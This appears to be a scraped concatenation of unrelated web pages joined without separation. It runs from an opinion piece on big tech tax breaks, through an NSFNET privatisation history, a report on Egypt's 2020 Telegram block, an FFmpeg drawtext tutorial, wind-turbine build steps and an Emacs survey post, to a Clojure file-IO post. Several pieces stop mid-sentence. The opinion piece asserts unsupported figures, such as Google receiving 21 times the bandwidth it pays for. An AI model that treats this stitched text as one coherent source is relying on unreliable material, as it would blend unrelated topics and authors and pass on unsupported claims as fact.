<p>For example, Google (Alphabet and YouTube) has long <a href="https://www.wired.com/2009/10/youtube-bandwidth/">received huge tax breaks</a> and is rarely if ever forced to pay in full for the massive bandwidth the company uses. In fact, YouTube was facing bandwidth affordability issues until it was purchased by Alphabet and Google, then it no longer had to worry about it – Google gets over 21 times more bandwidth than it actually pays for because of government intervention.</p>


<p>The same rules <a href="https://www.sfchronicle.com/politics/article/SF-supervisors-slam-the-Twitter-tax-break-13953248.php">apply to companies like Twitter</a>, Facebook, Netflix, Apple, etc. All of them <a href="https://www.theguardian.com/media/2019/feb/10/netflix-income-tax-2018-didnt-pay">enjoy extensive tax breaks</a> as well as cheap bandwidth that makes it impossible for small and medium sized businesses to compete, even if they operate on a superior model or have superior ideas. Many times the corporations pay no taxes whatsoever while smaller businesses are crippled by overt payments.</p>


<p>A true free market requires competition as a rule, but the current system deliberately crushes competition. Again, we live in a socialist framework, not a free market framework.</p>


<p>Now that we understand the nature of big tech and what these companies actually are (creations of government), the debate on social media censorship changes.</p>


<p>How? Take for example the fact that public universities in the US are not legally allowed to interfere with free speech rights because many of them survive by consuming taxpayer dollars. They are PUBLIC institutions, not private. Why then are we treating major corporations that survive on endless taxpayer infusions and incentives as if they are private businesses? They are not – They are publicly funded structures chartered by the government and therefore they should be subject to the same rules on free speech that universities are required to follow.</p>


<p>Said corporations will surely argue against this and will attempt to use legal chicanery to maintain their monopolies. Trying to dismantle them could take decades, and there are no guarantees that government officials will even make the attempt? Why would they? The relationship between government and corporations has been an advantageous one for establishment elites for decades.</p>


<p>Instead of challenging the corporate model in the Supreme Court, an easier option would be to simply take away all welfare and tax incentives for any big tech companies that refuse to allow free speech on their platforms. If Google had to pay normal price for the bandwidth it uses, the …</p></div></div></div></div>

<p>In the summer of 1986, Senator Al Gore, Jr., of Tennessee introduced an amendment to the Congressional Act that authorized the&nbsp; budget of the National Science Foundation (NSF). He called for the federal government to study the possibilities for “communications networks for supercomputers at universities and Federal research facilities.” To explain the purpose of this legislation, Gore called on a striking analogy:&nbsp;</p>



<blockquote><p>One promising technology is the development of fiber optic systems for voice and data transmission. Eventually we will see a system of fiber optic systems being installed nationwide. America’s highways transport people and materials across the country. Federal freeways connect with state highways which connect in turn with county roads and city streets. T<em>o transport data and ideas,</em> <em>we will need a telecommunications highway connecting users coast to coast, state to state, city to city</em>. The study required in this amendment will identify the problems and opportunities the nation will face in establishing that highway.<sup>1</sup></p></blockquote>



<p>In the following years, Gore and his allies would call for the creation of an “information superhighway”, or, more formally, a national information infrastructure (NII). As he intended, Gore’s analogy to the federal highway system summons to mind a central exchange that would bind together various local and regional networks, letting all American citizens communicate with one another. However, the analogy also misleads – Gore did not propose the creation of a federally-funded and maintained data network. He envisioned that the information superhighway, unlike its concrete and asphalt namesake, would come into being through the action of market forces, within a regulatory framework that would ensure competition, guarantee open, equal access to any service provider (what would later be known as “net neutrality”), and provide subsidies or other mechanisms to ensure universal service to the least fortunate members of society, preventing the emergence of a gap between the information rich and information poor.<sup>2</sup></p>



<p>Over the following decade, Congress slowly developed a policy response to the growing importance of computer networks to the American research community, to education, and eventually to society as a whole. Congress’ slow march towards an NII policy, however, could not keep up with the rapidly growing NSFNET, overseen by the neighboring bureaucracy of the executive branch. Despite its reputation for sclerosis, bureaucracy was created exactly because of its capacity, unlike a legislature, to respond to events immediately, without deliberation. And so it happened that, between 1988 and 1993, the NSF crafted the policies that would determine how the Internet became private, and thus went public. It had to deal every year with novel demands and expectations from NSFNET’s users and peer networks. In response, it made decisions on the fly, decisions which rapidly outpaced Congressional plans for guiding the development of an information superhighway. These decisions rested largely in the hands of a single man – Stephen Wolff.</p>



<h2>Acceptable Use</h2>



<p>Wolff earned a Ph.D. in electrical engineering at Princeton in 1961 (where he would have been a rough contemporary of Bob Kahn), and began what might have been a comfortable academic career, with a post-doctoral stint at Imperial College, followed by several years teaching at Johns Hopkins. But then he shifted gears, and took a position&nbsp; at the Ballistics Research lab in Aberdeen, Maryland. He stayed there for most of the 1970s and early 1980s, researching communications and computing systems for the U.S. Army. He introduced Unix into the lab’s offices, and managed Aberdeen’s connection to the ARPANET.<sup>3</sup></p>



<p>In 1986, the NSF recruited him to manage the NSF’s supercomputing backbone – he was a natural fit, given his experience connecting Army supercomputers to ARPANET. He became the principal architect of NSFNET’s evolution from that point until his departure in 1994, when he entered the private sector as a manager for Cisco Systems. The original intended function of the net that Wolff was hired to manage had been to connect researchers across the U.S. to NSF-funded supercomputing centers. As we saw last time, however, once Wolff and the other network managers saw how much demand the initial backbone had engendered, they quickly developed a new vision of NSFNET, as a communications grid for the entire American research and post-secondary education community.</p>



<p>However, Wolff did not want the government to be in the business of supplying network services on a permanent basis. In his view, the NSF’s role was to prime the pump, creating the initial demand needed to get a commercial networking services sector off the ground. Once that happened, Wolff felt it would be improper for a government entity to be in competition with viable for-profit businesses. So he intended to get NSF out of the way by privatizing the network, handing over control of the backbone to unsubsidized private entities and letting the market take over.</p>



<p>This was very much in the spirit of the times. Across the Western world, and across most of the political spectrum, government leaders of the 1980s touted privatization and deregulation as the best means to unleash economic growth and innovation after the relative stagnation of the 1970s. As one example among many, around the same time that NSFNET was getting off the ground, the FCC knocked down several decades-old constraints on corporations involved in broadcasting. In 1985, it removed the restriction on owning print and broadcast media in the same locality, and two year later it nullified the fairness doctrine, which had required broadcasters to present multiple views on public-policy debates.&nbsp;</p>



<p>From his post at NSF, Wolff had several levers at hand for accomplishing his goals. The first lay in the interpretation and enforcement of the network’s acceptable use policy (AUP). In accordance with NSF’s mission, the initial policy for the NSFNET backbone, in effect until June 1990, required all uses of the network to be in support of “scientific research and other scholarly activities.” This is quite restrictive indeed, and would seem to eliminate any possibility of commercial use of the network. But Wolff chose to interpret the policy liberally. Regularly mailing list postings about new product releases from a corporation that sold data processing software – was that not in support of scientific research? What about the decision to allow MCI’s email system to connect to the backbone, at the urging of Vint Cerf, who had left government employ to oversee the development of MCI Mail. Wolff rationalized this – and other later interconnections to commercial email systems such as CompuServe’s – as in support of research by making it possible for researchers to communicate digitally with a wider range of people that they might need to contact in the pursuit of their work. A stretch, perhaps. But Wolff saw that allowing some commercial traffic on the same infrastructure that was used for public NSF traffic would encourage the private investment needed to support academic and educational use on a permanent basis.&nbsp;</p>



<p>Wolff’s strategy of opening the door of NSFNET as far as possible to commercial entities got an assist from Congress in 1992, when Congressman Rick Boucher, who helped oversee NSF as chair of the Science Subcommittee, sponsored an amendment to the NSF charter which authorized any additional uses of NSFNET that would “tend to increase the overall capabilities of the networks to support such research and education activities.” This was an<em> ex post facto </em>validation of Wolff’s approach to commercial traffic, allowing virtually any activity as long as it produced profits that encouraged more private investment into NSFNET and its peer networks.&nbsp;&nbsp;</p>



<h2>Dual-Use Networks</h2>



<p>Wolff also fostered the commercial development of networking by supporting the regional networks’ reuse of their networking hardware for commercial traffic. As you may recall, the NSF backbone linked together a variety of not-for-profit regional nets, from NYSERNet in New York to Sesquinet in Texas to BARRNet in northern California. NSF did not directly fund the regional networks, but it did subsidize them indirectly, via the money it provided to labs and universities to offset the costs of their connection to their neighborhood regional net. Several of the regional nets then used this same subsidized infrastructure to spin off a for-profit commercial enterprise, selling network access to the public over the very same wires used for the research and education purposes sponsored by NSF. Wolff encouraged them to do so, seeing this as yet another way to accelerate the transition of the nation’s research and education infrastructure to private control.&nbsp;</p>



<p>This, too, accorded neatly with the political spirit of the 1980s, which encouraged private enterprise to profit from public largesse, in the expectation that the public would benefit indirectly through economic growth. One can see parallels with the dual-use regional networks in the 1980 Bayh-Dole Act, which defaulted ownership of patents derived from government-funded research to the organization performing the work, not to the government that paid for it.&nbsp;</p>



<p>The most prominent example of dual-use in action was PSINet, a for-profit company initially founded as Performance Systems International in 1988. William Schrader and Martin Schoffstall, the co-founder of NYSERNet and one of vice presidents’, respectively, created the company. Schofstall, a former BBN engineer and co-author of the Simple Network Management Protocol (SNMP) for managing the devices on an IP network, was the key technical leader. Schrader, an ambitious Cornell biology major and MBA who had helped his <em>alma mater </em>set up its supercomputing center and get it connected to NSFNET, provided the business drive. He firmly believed that …</p></div></div>

<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>

<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>




<h2 id="step-0-ensure-your-ffmpeg-is-compiled-with-libfreetype"><span id="Step_0_Ensure_your_FFmpeg_Is_Compiled_with_libfreetype"></span>Step 0: Ensure your FFmpeg Is Compiled with libfreetype<span></span></h2>



<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>

<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>

<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>

<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>

<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>

<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>

<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>

<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.

              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>

<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>

October 22, 2020 | https://emacsredux.com/blog/2020/10/22/state-of-emacs-survey/ | <a href="https://web.archive.org/web/*/https://emacsredux.com/blog/2020/10/22/state-of-emacs-survey/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>Recently I learned of the first-ever <a href="https://emacssurvey.org/">State of Emacs survey</a>
and I wanted to share a few thought about it with my readers. Okay, the survey is officially
named just “Emacs Survey”, but it clearly draws a lot of inspiration from the numerous
“State of Technology X” surveys that have become popular in recent years. That’s why
I took the liberty to re-frame it in a way that will probably be familiar to more people.</p>

<p>The “State of Something” surveys are typically ran by the teams
maintaining some project to assess the health of its ecosystem, the
needs of their users, the problems that need to be solved, the tools
that people are using and so on. A good example would be the <a href="https://clojure.org/news/2020/02/20/state-of-clojure-2020">State of
Clojure</a>,
that I participate in every year. There are similar surveys for many
programming languages and even for some tools - e.g. I ran in the past
a <a href="https://metaredux.com/posts/2019/11/02/state-of-cider.html">State of
CIDER</a>
survey.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> Ideally, the data collected from the surveys drives the
future development to some extent, and results in a better experience
for everyone involved. I can speak from experience that the “State of Clojure” and
“State of CIDER” surveys definitely influenced the direction of the projects.</p>

<p>The “State of Emacs” survey is a somewhat different, though.  One
thing that bothers me a bit about the Emacs survey is that its site
doesn’t list any clear purpose/goals for the survey. That definitely
seems pretty weird to me. I saw the survey discussed on the Emacs
mailing list and on
<a href="https://www.reddit.com/r/emacs/comments/je3eht/emacs_user_survey_2020_is_open/">Reddit</a>,
but sticking a paragraph of rationale on the survey site would have
certainly helped. The survey is also not official in the sense, that
it’s not initiated by Emacs’s development team, and judging by the
hostility the topic generated on the <code>emacs-devel</code> mailing list it’s
not like they were particularly excited about it.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> It was funny
that most of the comments were complaints about things like the use of
non-free JavaScript in the survey form and topics like that, instead
of some constructive conversation about the format of the survey. I
was especially upset about the hostility towards the amazing MELPA
project on the mailing list (in his typical style RMS even wanted
MELPA to be denounced in the survey, as he considers it evil). Implying that it’d be
easy to replace MELPA with some core Emacs repository is like a bad
joke, given how the deficiencies of GNU ELPA were the reason for the
rise of MELPA in the first place. Anyways, I’m digressing.</p>

<p>Despite of all my concerns, I hope that the survey be a success in the
sense that it will collect enough useful data points to influence the
future development roadmap of Emacs and align better the vision of
Emacs’s maintainers with the needs and the usage patterns of their
users.  I’ve already filled out the survey myself and I liked the
questions in it, although, I would have definitely structured it
somewhat differently. I see some constant trend to compare stuff in
Emacs with external packages (e.g. Magit vs <code>vc</code>, Flycheck vs Flymake,
Projectile vs <code>project.el</code>), which I find slightly bizarre given the
trend in Emacs to move as many built-in packages as possible to GNU
ELPA, and the fact that Emacs has always been about diversity of
solutions, picking whatever works best for you and so
on. Standardization efforts seems somewhat against the spirit of
Emacs, but that’s just my very personal take.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>In case someone is curious about my Emacs wish list - I don’t really
care about changing any defaults, package improvements or anything
like this.  I’d like to see more efforts for improving Emacs Lisp, the
standard library (libraries like <code>seq.el</code> and <code>map.el</code> were great additions IMO),
making it possible to build rich UIs in some sane manner (overlays are
quite limiting). I’d also love to see the bar to contributing to be lowered:</p>

<ul>
  <li>drop the contributor agreement</li>
  <li>discuss ideas in an (modern) issue tracker, instead of on a mailing list</li>
  <li>apply less political activism and more pragmatism in the conversation around new ideas/features<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ul>

<p>I doubt anything like this is going to happen any time soon, but one can dream, right?</p>

<p>Finally, I’m obviously curious how my own Emacs
Prelude and my packages like Projectile, crux and so on will fare in
the survey. Are Zenburn and Solarized still the most popular color themes out there?
You tell me! :-)</p>

<p>Big thanks to <a href="https://blog.abrochard.com/">Adrien Brochard</a> for undertaking this daunting
task and creating the “State of Emacs” survey!
It will be open until the end
of November. You can fill out the survey form directly

October 22, 2020 | https://www.brandonbloom.name/blog/2013/06/26/slurp-and-spit/ | <a href="https://web.archive.org/web/*/https://www.brandonbloom.name/blog/2013/06/26/slurp-and-spit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Does nobody teach fopen anymore?</h2>

<p>Many programmers start with “Hello World”. Shortly after that, it’s “Hello
$NAME”, with a string read off stdin. But soon, budding engineers get tired of
reminding their computer of their name each and every time their code runs.
When I was first learning to program, file IO was an early requirement. We were
taught how to read and write “data files” using little more than fopen,
fscanf, fprintf, and fclose.</p>

<p>Fast forward five to ten years; you find yourself writing your 10 millionth SQL
query, wishing for simpler times. Spend some more time with the NoSQL database
du jour and the humble fopen function will be but a distant memory.  Until that
one fateful day arrives where you’ve got a relatively simple program and
encounter the need for equally simple durability. Five years ago, you’d have
cracked your knuckles and hacked out a pair of “save” and “load” functions.
Today, you add a dependency on your favorite database driver, switch to the
shell, type <code>createdb myapp</code> and then dutifully begin defining a lovely schema.
Of course, now you need to either rework your models to conform to some horrid
ORM layer, or write save/load-style “hydrate” and “dehydrate” methods anyway.</p>

<p>Now, at ten years and a day, you decide it’s finally time to learn that hip new
programming language that everybody is talking about. You’ve got your book out,
you’ve rocked through all your favorite technical interview puzzles, and you’re
ready to put together a little web service for personal or small group use.  If
this was yesterday, you’d know exactly what dependency to add and how to
proceed, but that was yesterday. Today, you do some Googling or hop into IRC
looking to find out what’s popular.</p>

<p>Why don’t you even consider fopen?</p>

<h2>But files aren’t “Web Scale”!</h2>

<p>Is that really true? And do you really care? Should you really care?</p>

<p>The answer to all of these questions is “No”. Files can easily be “web scale”.
As of 2013, Hacker News is still running as a single process, on a single core,
of a single server, backed by a directory structure of simple data files.
Nearly 2 million page views are served daily. See <a href="https://news.ycombinator.com/item?id=5229522">this thread</a> and
<a href="https://news.ycombinator.com/item?id=5253773">this submission</a> for details.</p>

<p>The bottom line on this subject is that 1) You’re going to need significant
cleverness to scale any service regardless of whether you use a database or the
file system directly. And 2) You probably won’t need to scale hugely anytime
soon, anyway. Being crushed by traffic is a Good Problem To Have, so let’s
worry about the Ghost Town problem first. 3) You can always refactor later.</p>

<h2>Data Literals: print, read, spit, and slurp</h2>

<p>This article was prompted by a reoccurring discussion started by newcomers to
the Clojure IRC channel. Having learned the basics, folks want to hit the
ground running with stateful and durable services. Coming from a background in
some big framework or some hairy application, these folks ask those suggestive
questions about databases, driver libraries, and the like. Often, upon
interrogation, they only have a couple kilobytes or megabytes of total data to
be stored. In such a situation, the advice is always the same: Put that data
into an atom, then use <code>spit</code> and <code>slurp</code> to save and load.</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>(</span><span>def </span><span>db</span> <span>(</span><span>atom</span> <span>{</span><span>...</span><span>}))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>save-data</span> <span>[]</span>
</span><span>  <span>(</span><span>spit</span> <span>"somefile"</span> <span>(</span><span>prn-str </span><span>@</span><span>db</span><span>)))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>load-data</span> <span>[]</span>
</span><span>  <span>(</span><span>reset!</span> <span>db</span> <span>(</span><span>read-string</span> <span>(</span><span>slurp </span><span>"somefile"</span><span>))))</span>
</span></code></pre></div></div></figure>


<p>Because Clojure encourages the use of printable, readable, “pure” data, your
